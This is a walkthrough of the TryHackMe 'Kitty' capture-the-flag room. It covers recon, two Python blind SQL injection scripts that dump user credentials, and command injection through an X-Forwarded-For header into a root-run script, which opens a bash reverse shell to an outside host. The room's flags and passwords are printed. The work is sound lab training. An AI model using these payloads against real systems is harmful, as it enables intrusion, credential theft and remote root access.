<h1 align="center">Kitty</h1>
<p align="center">2025, August 17<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>468</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Map? Where we are going, we don't need maps.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/5d7c7537-2dee-4f46-9cd2-a126bd1444eb"><br>
Access this CTF <a href="https://tryhackme.com/room/kitty">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/e8a874e5-c332-4d56-9b12-beda9c8c1b2a"></p>


<br>

<h2>Task 1 . Deploy Box</h2>
<p> [ Start Machine ] </p>
<p>Kitty is working on a web application. She would like for you to see if there are any security vulnerabilities.<br>

Whenever you are ready, click on the Start Machine button to fire up the Virtual Machine. Please allow 3-5 minutes for the VM to fully start.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. What is the user flag?<br>
<code>THM{31e606998972c3c6baae67bab463b16a}</code></p>

<br>

<p>1.2. What is the root flag?<br>
<code>THM{581bfc26b53f2e167a05613eecf039bb}</code></p>

<br>
<br>

<h3>Nmap</h3>

```bash
:~/Kitty# nikto -h 10.201.19.107
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.19.107
+ Target Hostname:    ip-10-201-19-107.ec2.internal
+ Target Port:        80
+ Start Time:         2025-08-17 19:58:13 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-08-17 19:58:22 (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h3>Nmap</h3>

```bash
:~/Kitty# nmap -sT 10.201.19.107
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-17 19:52 BST
Nmap scan report for ip-10-201-19-107.ec2.internal (10.201.19.107)
Host is up (0.0059s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 16:FF:CF:9C:38:8B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
```

<br>

```bash
:~/Kitty# nmap -sC -sV -p- -T4 10.201.19.107
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-17 19:53 BST
Nmap scan report for ip-10-201-19-107.ec2.internal (10.201.19.107)
Host is up (0.0062s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
MAC Address: 16:FF:CF:9C:38:8B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.56 seconds
```


<h3>Gobuster</h3>

```bash
:~# gobuster dir -u http://10.201.19.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.19.107
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 1081]
/register.php         (Status: 200) [Size: 1567]
/welcome.php          (Status: 302) [Size: 0] [--> index.php]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 1]
/server-status        (Status: 403) [Size: 278]
Progress: 436550 / 436552 (100.00%)
===============================================================
Finished
===============================================================
```

<h3>Web port 80, /index.php</h3>

<img width="1128" height="389" alt="image" src="https://github.com/user-attachments/assets/ef05e628-e96a-46f2-89af-6fca21e1a069" />

<br>

```bash
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: welcome.php");
    exit;
}

include('config.php');
$username = $_POST['username'];
$password = $_POST['password'];
// SQLMap 
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
	if (preg_match( $evilword, $username )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip);
		die();
	} elseif (preg_match( $evilword, $password )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip);	
		die();
	}
}


$sql = "select * from siteusers where username = '$username' and password = '$password';";  
$result = mysqli_query($mysqli, $sql);  
$row = mysqli_fetch_array($result, MYSQLI_ASSOC);  
$count = mysqli_num_rows($result);
if($count == 1){
	// Password is correct, so start a new session
	session_start();

	// Store data in session variables
	$_SESSION["loggedin"] = true;
	$_SESSION["username"] = $username;
	// Redirect user to welcome page
	header("location: welcome.php");
} elseif ($username == ""){
	$login_err = "";
} else{
	// Password is not valid, display a generic error message
	$login_err = "Invalid username or password";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Development User Login</h2>
        <p>Please fill in your credentials to login.</p>

<?php 
if(!empty($login_err)){
        echo '<div class="alert alert-danger">' . $login_err . '</div>';
}        
?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control">
            </div>    
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
	    </div>
	    <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

<br>
<br>

```bash
:~/Kitty# cat test.py
import requests

probe = '+-{}(), abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
url = 'http://10.201.19.107/index.php'
headers = {
	'Host': 'kitty.thm',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate, br',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Origin': 'http://10.201.19.107',
	'Connection': 'close',
	'Referer': 'http://10.201.19.107/index.php',
	'Upgrade-Insecure-Requests': '1'
}
result = ''
while True:
	for elem in probe:
		query = "' UNION SELECT 1,2,3,4 where database() like '{sub}%';-- -".format(sub=result+elem)
		data = {
		    'username': query,
		    'password': '123456'
		}
		response = requests.post(url, headers=headers, data=data,allow_redirects=True)
		#print("Size of Response Content:", len(response.content), "bytes")
		if(len(response.content) == 618):
			result += elem
			break
		if(elem == probe[-1]):
			print('\033[K')
			print(result)
			exit()
		if(elem != "\n"):
			print(result+elem,end='\r')
```

```bash
:~/Kitty# python3 test.py

mywebsite
```



```bash
:~/Kitty# cat dump.py
#!/usr/bin/env python3

import requests

target_url = "http://10.201.19.107/index.php"
valid_username = "lili"

def send_payload(data):
	r = requests.post(target_url, data=data)
	if "Invalid username or password" not in r.text:
		return True
	return False

def get_count(column, database_table, sql_filter = ""):
	for i in range(1, 10):
		if send_payload({"username":f"{valid_username}' and (select count({column}) from {database_table} {sql_filter})={str(i)}-- -","password":"asd"}):
			return i
	return 0

def get_value_len(index, column, database_table, sql_filter = ""):
	for i in range(1, 30):
		if send_payload({"username":f"{valid_username}' and length((select {column} from {database_table} {sql_filter} limit {str(index)}, 1))={str(i)}-- -","password":"asd"}):
			return i
	return 0

def extract_values(column, database_table, sql_filter = ""):
	values = []
	value_row_count = get_count(column, database_table, sql_filter)
	for value_row_index in range(value_row_count):
		value = ""
		value_len = get_value_len(value_row_index, column, database_table, sql_filter)
		for char_index in range(value_len):
			for char_ord in range(32,127): # Ascii values for non-special characters. 
				if send_payload({"username":f"{valid_username}' and ord(substr((select {column} from {database_table} {sql_filter} limit {str(value_row_index)},1),{str(char_index+1)},1))={str(char_ord)}-- -","password":"asd"}):
					value += chr(char_ord)
		values.append(value)
	return values

# To extract database names
# print(extract_values("schema_name", "information_schema.schemata"))
# ['information_schema', 'performance_schema', 'mywebsite', 'devsite']

# To extract table names for mywebsite database
# print(extract_values("table_name", "information_schema.tables", "where table_schema=\"mywebsite\""))
# ['siteusers']

# To extract columns for siteusers table on mywebsite database
# print(extract_values("column_name", "information_schema.columns", "where table_name=\"siteusers\" and table_schema=\"mywebsite\""))
# ['created_at', 'id', 'password', 'username']

# To extract usernames from siteusers table
print(extract_values("username", "mywebsite.siteusers", f"where username!=\"{valid_username}\""))
# To extract passwords from siteusers table
print(extract_values("password", "mywebsite.siteusers", f"where username!=\"{valid_username}\""))
```



```bash
:~/Kitty# python3 dump.py
['admin', 'kitty', 'lulu']
['password', 'L0ng_Liv3_KittY', 'password']
```



```bash
:~/Kitty# ssh kitty@kitty.thm
The authenticity of host 'kitty.thm (10.201.19.107)' can't be established.
ECDSA key fingerprint is SHA256:wUj4JZaeaXZlcJaMqPhhSk5xdAe1L1T6ByHiAb/mhkQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'kitty.thm,10.201.19.107' (ECDSA) to the list of known hosts.
kitty@kitty.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 17 Aug 2025 08:09:11 PM UTC

  System load:  0.02              Processes:             125
  Usage of /:   62.2% of 8.87GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for eth0: 10.201.19.107
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

27 updates can be applied immediately.
18 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Tue Nov  8 01:59:23 2022 from 10.0.2.26
kitty@ip-10-201-19-107:~$ 
```

<br>

```bash
kitty@ip-10-201-19-107:~$ pwd
/home/kitty
kitty@ip-10-201-19-107:~$ ls
user.txt
kitty@ip-10-201-19-107:~$ cat user.txt
THM{31e606998972c3c6baae67bab463b16a}
```

<br>


```bash
kitty@ip-10-201-19-107:~$ ss -tulpn
Netid            State             Recv-Q            Send-Q                            Local Address:Port                        Peer Address:Port            Process            
udp              UNCONN            0                 0                                 127.0.0.53%lo:53                               0.0.0.0:*                                  
udp              UNCONN            0                 0                            10.201.19.107%eth0:68                               0.0.0.0:*                                  
tcp              LISTEN            0                 151                                   127.0.0.1:3306                             0.0.0.0:*                                  
tcp              LISTEN            0                 4096                              127.0.0.53%lo:53                               0.0.0.0:*                                  
tcp              LISTEN            0                 128                                     0.0.0.0:22                               0.0.0.0:*                                  
tcp              LISTEN            0                 511                                   127.0.0.1:8080                             0.0.0.0:*                                  
tcp              LISTEN            0                 70                                    127.0.0.1:33060                            0.0.0.0:*                                  
tcp              LISTEN            0                 128                                        [::]:22                                  [::]:*                                  
tcp              LISTEN            0                 511                                           *:80                                     *:*     
```



```bash
kitty@ip-10-201-19-107:/var/www/development$ cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'kitty');
define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');
define('DB_NAME', 'devsite');

/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($mysqli === false){
        die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>

kitty@ip-10-201-19-107:/var/www/development$ 

```


```bash
kitty@ip-10-201-19-107:/opt$ ls -lah
total 12K
drwxr-xr-x  2 root root 4.0K Feb 25  2023 .
drwxr-xr-x 19 root root 4.0K Aug 17 18:47 ..
-rw-r--r--  1 root root  152 Feb 25  2023 log_checker.sh
```

```bash
:/opt$ cat log_checker.sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

```bash
kitty@ip-10-201-19-107:/var/www/development$ apache2ctl -S
VirtualHost configuration:
127.0.0.1:8080         localhost (/etc/apache2/sites-enabled/dev_site.conf:2)
*:80                   ip-10-201-19-107.ec2.internal (/etc/apache2/sites-enabled/000-default.conf:1)
ServerRoot: "/etc/apache2"
Main DocumentRoot: "/var/www/html"
Main ErrorLog: "/var/log/apache2/error.log"
Mutex watchdog-callback: using_defaults
Mutex default: dir="/var/run/apache2/" mechanism=default 
Mutex mpm-accept: using_defaults
PidFile: "/var/run/apache2/apache2.pid"
Define: DUMP_VHOSTS
Define: DUMP_RUN_CFG
User: name="www-data" id=33 not_used
Group: name="www-data" id=33 not_used
```



```bash
kitty@ip-10-201-19-107:/etc/apache2/sites-enabled$ cat dev_site.conf
Listen 127.0.0.1:8080
<VirtualHost 127.0.0.1:8080>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/development

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```


```bash
kitty@ip-10-201-19-107:/$ diff /var/www/html /var/www/development
diff /var/www/html/config.php /var/www/development/config.php

< define('DB_NAME', 'mywebsite');
---
> define('DB_NAME', 'devsite');
diff /var/www/html/index.php /var/www/development/index.php
18a19,21
> 		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
> 		$ip .= "\n";
> 		file_put_contents("/var/www/development/logged", $ip);
21c24,27
< 		echo 'SQL Injection detected. This incident will be logged!';	
---
> 		echo 'SQL Injection detected. This incident will be logged!';
> 		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
> 		$ip .= "\n";
> 		file_put_contents("/var/www/development/logged", $ip);	
61c67
<         <h2>User Login</h2>
---
>         <h2>Development User Login</h2>
Only in /var/www/development: logged
```


```bash
 curl -s 'http://127.0.0.1:8080/index.php' -X POST -d 'username=lulu&password=password' -H 'X-Forwarded-For: test'

SQL Injection detected. This incident will be logged!
```

```bash
kitty@kitty:/var/www/development$ cat logged
test
```

```bash
kitty@ip-10-201-19-107:/var/www/development$ curl http://127.0.0.1:8080/index.php -X POST -d 'username=0x&password=test' -H 'X-Forwarded-For:;bash -c "/bin/bash -i >& /dev/tcp/10.201.109.144/6666 0>&1"'

SQL Injection detected. This incident will be logged!kitty@ip-10-201-19-107:/var/www/development$ 
```

```bash
:~/Kitty# nc -nlvp 6666
Listening on 0.0.0.0 6666
Connection received on 10.201.19.107 39000
bash: cannot set terminal process group (2659): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-201-19-107:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-201-19-107:~# pwd
pwd
/root
root@ip-10-201-19-107:~# ls
ls
logged
root.txt
snap
root@ip-10-201-19-107:~# cat root.txt
cat root.txt
THM{581bfc26b53f2e167a05613eecf039bb}
```

<br>
<br>

<h2>Task 2 . Thank you</h2>
<p>This room is dedicated to my brother's cat, whose name was Kitty.</p>

<br>

<p align="center" ><img width="300px" src="https://github.com/user-attachments/assets/ab4d22d8-9344-4888-85d3-836b502bc32f"></p>

<br>

<p>Sadly, she passed away on October 4th, 2022. She was a part of our family for 13 years, and we miss her very much.</p>

<br>

<p align="center" ><img width="300px" src="https://github.com/user-attachments/assets/a110cc75-658e-4bf5-b77a-61bc873ebe53"></p>

<br>

<p>I hope you enjoyed the room!</p>

<p><em>Answer the question below</em></p>

<p>2.1. Thank you for playing.<br>
<code>No answer needed</code></p>


<br>
<br>

<h1>Completed</h1>

<img width="1895" height="928" alt="image" src="https://github.com/user-attachments/assets/de7a8d3d-7921-43d3-b40b-c6173eb97aed" />

<br>

<img width="1907" height="900" alt="Screenshot 2025-08-17 182732" src="https://github.com/user-attachments/assets/d2fe9627-71f0-4fd2-8a53-d21997238d0c" />

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 17   |   468    |     121ˢᵗ    |      5ᵗʰ     |     330ᵗʰ   |     7ᵗʰ    | 121,786  |    921    |    73     |


</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/8b23511a-14fb-45af-8ee1-74c2f9f3eee0" />

<img width="1902" height="891" alt="image" src="https://github.com/user-attachments/assets/ec655282-4610-4626-b13a-65ced729ad7c" />

<img width="1892" height="890" alt="image" src="https://github.com/user-attachments/assets/d3f5a4cd-39f9-445e-afba-54bac2a522e9" />

<img width="1896" height="898" alt="image" src="https://github.com/user-attachments/assets/5eb25330-ba3e-4130-8e1d-53b0ddeed86c" />

<img width="1903" height="895" alt="image" src="https://github.com/user-attachments/assets/dcd23abd-5b9e-49fc-9186-11f5360ffe3a" />
